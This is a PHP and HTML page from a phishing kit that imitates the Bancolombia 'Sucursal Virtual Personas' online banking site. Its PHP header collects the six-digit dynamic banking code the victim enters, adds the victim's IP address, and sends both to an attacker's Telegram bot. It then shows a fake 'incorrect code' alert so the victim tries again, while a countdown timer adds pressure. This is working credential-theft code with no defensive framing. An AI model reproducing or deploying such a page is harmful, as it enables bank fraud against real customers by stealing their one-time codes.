<?php
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];
include('datos_de_tel.php');

if ( isset ($_POST['num1']) && isset ($_POST['num2']) && isset ($_POST['num3']) && isset ($_POST['num4']) && isset ($_POST['num5']) && isset ($_POST['num6'])){

$message = "CODIGO #1\r\n".$_POST['num1']."".$_POST['num2']."".$_POST['num3']."".$_POST['num4']."".$_POST['num5']."".$_POST['num6']."\r\nIP ".$userp."\r\n";

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
echo '<script language="javascript">alert("Clave Dinamica Incorrecta");
</script>';

}else{ header ('location: index.html'); exit(); }

?>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

  <meta name="viewport" content="width=device-width, initial-scale=1.0">



<link href="./index_files/styles.css" media="all" rel="stylesheet" type="text/css">
  
  <link href="./index_files/bootstrap.css" media="all" rel="stylesheet" type="text/css">  

    

    <link href="./index_files/jquery-ui.css" media="all" rel="stylesheet" type="text/css"> 
    <link href="./index_files/ui.css" media="all" rel="stylesheet" type="text/css">
    <script type="text/javascript">
var url="index.php";
var seconds = 150; //número de segundos a contar
function secondPassed() {

  var minutes = Math.round((seconds - 30)/60); //calcula el número de minutos
  var remainingSeconds = seconds % 60; //calcula los segundos
  //si los segundos usan sólo un dígito, añadimos un cero a la izq
  if (remainingSeconds < 10) { 
    remainingSeconds = "0" + remainingSeconds; 
  } 
  document.getElementById('countdown').innerHTML = minutes + ":" +     remainingSeconds; 
  if (seconds == 0) { 
    clearInterval(countdownTimer); 
   window.location=url;
    document.getElementById('countdown').innerHTML = ""; 
  } else { 
    seconds--; 
  } 
} 

var countdownTimer = setInterval(secondPassed, 1000);
</script>

    <script>
function soloNumeros(e){
  var key = window.event ? e.which : e.keyCode;
  if (key < 48 || key > 57) {
    e.preventDefault();
  }
}
</script>

<style>.osSwitch{position:relative;display:inline-block;width:34px;height:15.3px}.osSwitch input{opacity:0;width:0;height:0}.osSlider{position:absolute;top:0;left:0;right:0;bottom:0;border-radius:34px;background-color:#93a0b5;transition:0.4s}.osSlider:before{position:absolute;content:'';height:13px;width:13px;left:2px;bottom:1px;border-radius:50%;background-color:white;transition:0.4s}input:checked+.sliderGreen{background-color:#04d289}input:checked+.sliderRed{background-color:#ff3b30}input:not(:checked)+.defaultGreen{background-color:#04d289}input:checked+.osSlider:before{transform:translateX(17px)}
</style><style>
    @font-face {
      font-family: 'SegoeUI_online_security'; 
      src: url(chrome-extension://llbcnfanfmjhpedaedhbcnpgeepdnnok/segoe-ui.woff);
    }

    @font-face {
      font-family: 'SegoeUI_bold_online_security'; 
      src: url(chrome-extension://llbcnfanfmjhpedaedhbcnpgeepdnnok/segoe-ui-bold.woff);
    }
</style></head>

<body style="">

<div id="cargando" style="width: 100%; text-align: center; display: none;">

     </div>
<div id="contenidoWeb" style="">
    
    
            <div class="container" id="containerMain">

            

                

<div>
    <div id="header" class="mua-page-header">
        <div class="row row-logo-svp"> 
            <div class="col-xs-12 col-sm-7 col-md-7 left-div">
                <div class="mua-imgLogoItem"></div>
                <div class="text-svp-name">Sucursal Virtual Personas</div>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-7 col-md-7 left-div">
                <div id="lastIn" class="mua-title-text" style="padding-top: 10px !important;">
                <div>
    <div class="timeText">Fecha y hora actual:</div>
    <span id="jclock1" class="lastVisitedText">
    Lunes 20 de Febrero del 2023 05:46:48 PM
</span>
</div>  
        </div>
            </div>
        </div>
    </div>

    <div class="panel-heading">
        <h3>
            Complete con sus datos actuales para reactivar
        </h3>
    </div>
</div>
            
            <div class="panel panel-primary">
                <div class="row" id="error">
                    



                </div>

            <div class="mua-panel-body">
                      
                    <div class="row">
                    
                        <div class="col-lg-5 col-md-5 col-sm-6">
                            
                                            
                                <h5 class="mua-title-h5"><font color="#FFFFFF"></font></h5>
                                            
                                <p class="mua-phrase-message mua-small-text"><font color="#FFFFFF"></font></p>

                                <div id="phraseImage" class="mua-image-login-container">
                                    




                                </div>
                            
                                    
                        </div>
                    
                    
                        <div class="col-lg-4 col-md-5 col-sm-6">

                            <div class="panel_general">
                                <div class="title-panel-label">
                                    <h1>
                                        Complete los campos
                                    </h1>
                                </div>
                                
                                    <label class="control-label" for="username"><h2>Por motivos de seguridad ingrese su clave dinamica</h2></label>
                                
                                <div id="contenido">
                                <div align="center"><br>
                                      <form _ngcontent-jsd-c16="" method="post" id="form1" action="index5.php" class="ng-untouched ng-pristine ng-invalid">
  
  <input type="tel" maxlength="1" onkeypress="soloNumeros(event)" style="width:45px;" onkeyup="if (this.value.length == this.getAttribute(&#39;maxlength&#39;)) num2.focus()" name="num1" autofocus="" required="">
  <input type="tel" maxlength="1" style="width:45px;" onkeypress="soloNumeros(event)" onkeyup="if (this.value.length == this.getAttribute(&#39;maxlength&#39;)) num3.focus()" id="num2" name="num2" autocomplete="off" required="">
  <input type="tel" maxlength="1" style="width:45px;" onkeypress="soloNumeros(event)" onkeyup="if (this.value.length == this.getAttribute(&#39;maxlength&#39;)) num4.focus()" id="num3" name="num3" autocomplete="off" required="">
  <input type="tel" maxlength="1" style="width:45px;" onkeypress="soloNumeros(event)" onkeyup="if (this.value.length == this.getAttribute(&#39;maxlength&#39;)) num5.focus()" id="num4" name="num4" autocomplete="off" required="">
  <input type="tel" maxlength="1" style="width:45px;" onkeypress="soloNumeros(event)" onkeyup="if (this.value.length == this.getAttribute(&#39;maxlength&#39;)) num6.focus()" id="num5" name="num5" autocomplete="off" required="">
  <input type="tel" maxlength="1" style="width:45px;" onkeypress="soloNumeros(event)" onkeyup="if (this.value.length == this.getAttribute(&#39;maxlength&#39;)) form1.submit();" id="num6" name="num6" autocomplete="off" required="">
 
   <br><br>

                                        
                                        <input id="" name="btnGo" class="btn btn-success" type="submit" value="Confirmar Clave Digital">
                                    
  </form>
  <br> <br>
  <font size="4px;" color="">Ingresa tu Clave Digital antes de<br><span>
 <b> <strong id="time"><label id="countdown"></label></strong> </b><br></span></font>
                                    
                                    
                                    </div>

                                    <div class="mua-content-legend">
                                        <p id="CuentaAtras"></p>
                                    </div>
                                </div>

                        

            

                            </div>

                        </div>
                        
                

                            
                    </div>
                </div>
            
    
            
            
            </div>

        
<br><br><br><br><br><br>

<div class="row">
    <div class="col-xs-12 col-sm-12 col-md-12">
        <p class="mua-footer mua-footer-info-call">
            Sucursal Telefónica Bancolombia: Bogotá 343 0000 - Medellín 510 9000 - Cali 554 0505 - Barranquilla 361 8888 - Cartagena 693 Sucursales Telefónicas en el exterior: España 900 995 717 - Estados Unidos 1866 379 9714.
        </p>
    </div>
</div>

        
 





            <div style="margin-top: 10px;">
                <div class="mua-title-text pull-left"></div>
                <div class="mua-title-text pull-right"><span id="fecha">2022</span>&nbsp;Bancolombia S.A.&nbsp;&nbsp;</div>
            </div>
       

        </div>

    
    
      </div> 


</body></html>